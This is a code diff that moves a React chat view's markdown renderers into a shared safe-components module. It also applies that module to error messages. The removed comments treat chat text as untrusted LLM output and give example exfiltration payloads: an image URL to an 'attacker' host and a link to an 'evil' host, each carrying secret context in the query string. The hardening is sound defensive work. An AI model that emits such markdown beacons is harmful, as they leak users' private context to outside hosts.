@@ -3,7 +3,7 @@ import { User, Loader2, MessageSquareText, Mic, FileText, X, Code, PenTool, Grad
 import { LogEntry, RequiredAction } from '../types/index.js';
 import ReactMarkdown from 'react-markdown';
 import remarkGfm from 'remark-gfm';
-import { CodeBlock } from './CodeBlock.js';
+import { safeMarkdownComponents } from '../lib/markdownComponents.js';
 import { AnimatedEntrance } from './AnimatedEntrance.js';
 
 interface GeneralChatAreaProps {
@@ -286,44 +286,7 @@ export function GeneralChatArea({ logs, status, requiredAction, onOpenSettings, 
                                                         <div className="markdown-body prose prose-zinc dark:prose-invert max-w-none prose-p:my-2 prose-headings:mt-5 prose-headings:mb-2 prose-li:my-0.5 prose-ul:my-2 prose-ol:my-2">
                                                             <ReactMarkdown
                                                                 remarkPlugins={[remarkGfm]}
-                                                                components={{
-                                                                    code({ node, inline, className, children, ...props }: any) {
-                                                                        const match = /language-(\w+)/.exec(className || '')
-                                                                        return (!inline && match) ? (
-                                                                            <CodeBlock
-                                                                                {...props}
-                                                                                language={match[1]}
-                                                                                children={children}
-                                                                            />
-                                                                        ) : (
-                                                                            <code {...props} className={`${className} bg-zinc-100 dark:bg-zinc-800 px-1.5 py-0.5 rounded text-[13px] font-medium text-zinc-800 dark:text-zinc-200`}>
-                                                                                {children}
-                                                                            </code>
-                                                                        )
-                                                                    },
-                                                                    img({ alt }: any) {
-                                                                        // The chat content is UNTRUSTED LLM output. Do NOT auto-load images: the
-                                                                        // fetch itself is a zero-click exfiltration beacon (the LLM can put context
-                                                                        // in the URL, e.g. ![](https://attacker/p?ctx=secret), and the browser sends
-                                                                        // it). Show the alt text instead of rendering an <img> (deep-hunt).
-                                                                        return <span className="text-zinc-400 dark:text-zinc-500 italic">[image omitted: {alt || 'untitled'}]</span>
-                                                                    },
-                                                                    a({ href, children }: any) {
-                                                                        // Q-273: chat is UNTRUSTED LLM output. A link like [click](https://evil/?leak=…)
-                                                                        // is a one-click exfiltration/phishing vector. Allow only http(s)/mailto (block
-                                                                        // javascript:/data:), open with no referrer, and SHOW the real destination so a
-                                                                        // misleading link text can't hide where it goes.
-                                                                        const url = typeof href === 'string' ? href : ''
-                                                                        const safe = /^(https?:|mailto:)/i.test(url)
-                                                                        if (!safe) return <span>{children}</span>
-                                                                        const textIsUrl = typeof children?.[0] === 'string' && children[0] === url
-                                                                        return (
-                                                                            <a href={url} target="_blank" rel="noopener noreferrer nofollow" title={url} className="text-purple-600 dark:text-purple-400 underline underline-offset-2">
-                                                                                {children}{!textIsUrl && <span className="text-zinc-400 dark:text-zinc-500 text-[11px] ml-1">({url})</span>}
-                                                                            </a>
-                                                                        )
-                                                                    }
-                                                                }}
+                                                                components={safeMarkdownComponents}
                                                             >
                                                                 {stripToolCallXml(log.message)}
                                                             </ReactMarkdown>
@@ -350,7 +313,7 @@ export function GeneralChatArea({ logs, status, requiredAction, onOpenSettings, 
                                         <div key={log.id} className="py-3">
                                             <div className="bg-red-50 dark:bg-red-500/5 border border-red-200/70 dark:border-red-500/15 rounded-xl p-4 shadow-sm">
                                                 <div className="text-[14px] text-red-800 dark:text-red-300 leading-relaxed prose prose-sm prose-red dark:prose-invert max-w-none [&>p]:mb-2 [&>ol]:mt-2 [&>ul]:mt-2 [&>ol>li]:mb-1 [&>ul>li]:mb-1">
-                                                    <ReactMarkdown remarkPlugins={[remarkGfm]}>{log.message}</ReactMarkdown>
+                                                    <ReactMarkdown remarkPlugins={[remarkGfm]} components={safeMarkdownComponents}>{log.message}</ReactMarkdown>
                                                 </div>
                                             </div>
                                         </div>
